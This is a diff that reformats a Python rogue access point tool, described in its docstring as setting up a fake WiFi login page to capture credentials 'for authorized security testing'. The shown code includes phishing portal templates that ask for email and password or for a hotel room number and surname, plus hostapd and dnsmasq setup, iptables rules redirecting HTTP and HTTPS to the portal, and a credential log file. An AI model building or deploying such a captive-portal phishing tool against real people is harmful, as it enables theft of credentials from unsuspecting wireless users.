@@ -5,21 +5,20 @@ Sets up a rogue AP with a fake login page to capture credentials
 For authorized security testing and research only
 """
 
-import sys
-import os
 import argparse
-import subprocess
+import os
 import signal
-import threading
-import time
+import subprocess
+import sys
 import tempfile
+import time
 from datetime import datetime
 from typing import Optional
 
-from flask import Flask, request as flask_request, redirect
+from flask import Flask, redirect
+from flask import request as flask_request
 
-from utils import validate_interface, require_root, setup_logging
-
+from utils import require_root, setup_logging, validate_interface
 
 PORTAL_TEMPLATES: dict[str, dict] = {
     "default": {
@@ -27,8 +26,18 @@ PORTAL_TEMPLATES: dict[str, dict] = {
         "heading": "Connect to WiFi",
         "subtitle": "Please sign in to access the internet",
         "fields": [
-            {"name": "email", "type": "email", "label": "Email Address", "placeholder": "you@example.com"},
-            {"name": "password", "type": "password", "label": "Password", "placeholder": "Enter password"},
+            {
+                "name": "email",
+                "type": "email",
+                "label": "Email Address",
+                "placeholder": "you@example.com",
+            },
+            {
+                "name": "password",
+                "type": "password",
+                "label": "Password",
+                "placeholder": "Enter password",
+            },
         ],
         "button": "Connect",
     },
@@ -37,8 +46,18 @@ PORTAL_TEMPLATES: dict[str, dict] = {
         "heading": "Welcome, Guest",
         "subtitle": "Enter your room details to connect",
         "fields": [
-            {"name": "room_number", "type": "text", "label": "Room Number", "placeholder": "e.g. 302"},
-            {"name": "last_name", "type": "text", "label": "Last Name", "placeholder": "Guest last name"},
+            {
+                "name": "room_number",
+                "type": "text",
+                "label": "Room Number",
+                "placeholder": "e.g. 302",
+            },
+            {
+                "name": "last_name",
+                "type": "text",
+                "label": "Last Name",
+                "placeholder": "Guest last name",
+            },
         ],
         "button": "Connect",
     },
@@ -47,7 +66,12 @@ PORTAL_TEMPLATES: dict[str, dict] = {
         "heading": "Sign in to continue",
         "subtitle": "Enter your email to get online",
         "fields": [
-            {"name": "email", "type": "email", "label": "Email Address", "placeholder": "you@example.com"},
+            {
+                "name": "email",
+                "type": "email",
+                "label": "Email Address",
+                "placeholder": "you@example.com",
+            },
         ],
         "button": "Get Online",
     },
@@ -55,12 +79,17 @@ PORTAL_TEMPLATES: dict[str, dict] = {
 
 
 class CaptivePortal:
-    def __init__(self, interface: str, ssid: str = "Free-WiFi",
-                 channel: int = 6, portal_template: str = "default",
-                 log_file: str = "captures/portal_creds.log",
-                 bind_address: str = "192.168.100.1",
-                 dns_redirect: bool = True,
-                 portal_port: int = 8080) -> None:
+    def __init__(
+        self,
+        interface: str,
+        ssid: str = "Free-WiFi",
+        channel: int = 6,
+        portal_template: str = "default",
+        log_file: str = "captures/portal_creds.log",
+        bind_address: str = "192.168.100.1",
+        dns_redirect: bool = True,
+        portal_port: int = 8080,
+    ) -> None:
         self.interface: str = interface
         self.ssid: str = ssid
         self.channel: int = channel
@@ -87,7 +116,7 @@ class CaptivePortal:
                 f'<label for="{field["name"]}">{field["label"]}</label>'
                 f'<input type="{field["type"]}" name="{field["name"]}" '
                 f'id="{field["name"]}" placeholder="{field["placeholder"]}" required>'
-                f'</div>\n'
+                f"</div>\n"
             )
 
         return f"""<!DOCTYPE html>
@@ -180,9 +209,7 @@ p{color:#666;font-size:.9rem}
             f"auth_algs=1\n"
         )
 
-        conf_file = tempfile.NamedTemporaryFile(
-            mode="w", suffix="_hostapd.conf", delete=False
-        )
+        conf_file = tempfile.NamedTemporaryFile(mode="w", suffix="_hostapd.conf", delete=False)
         conf_file.write(hostapd_conf)
         conf_file.close()
         self._temp_files.append(conf_file.name)
@@ -190,15 +217,18 @@ p{color:#666;font-size:.9rem}
         try:
             subprocess.run(
                 ["ip", "addr", "flush", "dev", self.interface],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
             subprocess.run(
                 ["ip", "addr", "add", f"{self.bind_address}/24", "dev", self.interface],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
             subprocess.run(
                 ["ip", "link", "set", self.interface, "up"],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
         except (subprocess.TimeoutExpired, FileNotFoundError) as e:
             self.logger.error("Failed to configure interface: %s", e)
@@ -207,7 +237,8 @@ p{color:#666;font-size:.9rem}
         try:
             self._hostapd_proc = subprocess.Popen(
                 ["hostapd", conf_file.name],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(2)
             if self._hostapd_proc.poll() is not None:
@@ -233,9 +264,7 @@ p{color:#666;font-size:.9rem}
             f"log-dhcp\n"
         )
 
-        conf_file = tempfile.NamedTemporaryFile(
-            mode="w", suffix="_dnsmasq.conf", delete=False
-        )
+        conf_file = tempfile.NamedTemporaryFile(mode="w", suffix="_dnsmasq.conf", delete=False)
         conf_file.write(dnsmasq_conf)
         conf_file.close()
         self._temp_files.append(conf_file.name)
@@ -243,7 +272,8 @@ p{color:#666;font-size:.9rem}
         try:
             self._dnsmasq_proc = subprocess.Popen(
                 ["dnsmasq", "-C", conf_file.name, "-d"],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(1)
             if self._dnsmasq_proc.poll() is not None:
@@ -257,10 +287,40 @@ p{color:#666;font-size:.9rem}
 
     def _setup_iptables(self) -> None:
         rules = [
-            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
-             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
-            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
-             "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
+            [
+                "iptables",
+                "-t",
+                "nat",
+                "-A",
+                "PREROUTING",
+                "-i",
+                self.interface,
+                "-p",
+                "tcp",
+                "--dport",
+                "80",
+                "-j",
+                "REDIRECT",
+                "--to-port",
+                str(self.portal_port),
+            ],
+            [
+                "iptables",
+                "-t",
+                "nat",
+                "-A",
+                "PREROUTING",
+                "-i",
+                self.interface,
+                "-p",
+                "tcp",
+                "--dport",
+                "443",
+                "-j",
+                "REDIRECT",
+                "--to-port",
+                str(self.portal_port),
+            ],
         ]
         for rule in rules:
             try:
@@ -271,10 +331,40 @@ p{color:#666;font-size:.9rem}
 
     def _cleanup_iptables(self) -> None:
         rules = [
-            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", self.interface,
-             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
-            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", self.interface,
-             "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
+            [
+                "iptables",
+                "-t",
+                "nat",
+                "-D",
+                "PREROUTING",
+                "-i",
+                self.interface,
+                "-p",
+                "tcp",
+                "--dport",
+                "80",
+                "-j",
+                "REDIRECT",
+                "--to-port",
+                str(self.portal_port),
+            ],
+            [
+                "iptables",
+                "-t",
+                "nat",
+                "-D",
+                "PREROUTING",
+                "-i",
+                self.interface,
+                "-p",
+                "tcp",
+                "--dport",
+                "443",
+                "-j",
+                "REDIRECT",
+                "--to-port",
+                str(self.portal_port),
+            ],
         ]
         for rule in rules:
             try:
@@ -329,8 +419,10 @@ p{color:#666;font-size:.9rem}
         self.logger.info("Captive portal running. Press Ctrl+C to stop.")
         try:
             self._portal_app.run(
-                host="0.0.0.0", port=self.portal_port,
-                debug=False, use_reloader=False,
+                host="0.0.0.0",
+                port=self.portal_port,
+                debug=False,
+                use_reloader=False,
             )
         except Exception:
             if not self._shutdown_requested:
@@ -341,7 +433,7 @@ p{color:#666;font-size:.9rem}
     def stop(self) -> None:
         self.logger.info("Shutting down captive portal...")
 
-        for proc, name in [
+        for proc, _name in [
             (self._hostapd_proc, "hostapd"),
             (self._dnsmasq_proc, "dnsmasq"),
         ]:
@@ -389,23 +481,26 @@ Note: Requires hostapd and dnsmasq installed.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface")
-    parser.add_argument("-s", "--ssid", default="Free-WiFi",
-                        help="SSID to broadcast (default: Free-WiFi)")
-    parser.add_argument("-ch", "--channel", type=int, default=6,
-                        help="WiFi channel (default: 6)")
-    parser.add_argument("-t", "--template", default="default",
-                        choices=list(PORTAL_TEMPLATES.keys()),
-                        help="Portal template (default: default)")
-    parser.add_argument("-o", "--output", default="captures/portal_creds.log",
-                        help="Credential log file")
-    parser.add_argument("--bind", default="192.168.100.1",
-                        help="Portal bind address (default: 192.168.100.1)")
-    parser.add_argument("--no-dns-redirect", action="store_true",
-                        help="Disable DNS redirect")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    parser.add_argument(
+        "-s", "--ssid", default="Free-WiFi", help="SSID to broadcast (default: Free-WiFi)"
+    )
+    parser.add_argument("-ch", "--channel", type=int, default=6, help="WiFi channel (default: 6)")
+    parser.add_argument(
+        "-t",
+        "--template",
+        default="default",
+        choices=list(PORTAL_TEMPLATES.keys()),
+        help="Portal template (default: default)",
+    )
+    parser.add_argument(
+        "-o", "--output", default="captures/portal_creds.log", help="Credential log file"
+    )
+    parser.add_argument(
+        "--bind", default="192.168.100.1", help="Portal bind address (default: 192.168.100.1)"
+    )
+    parser.add_argument("--no-dns-redirect", action="store_true", help="Disable DNS redirect")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
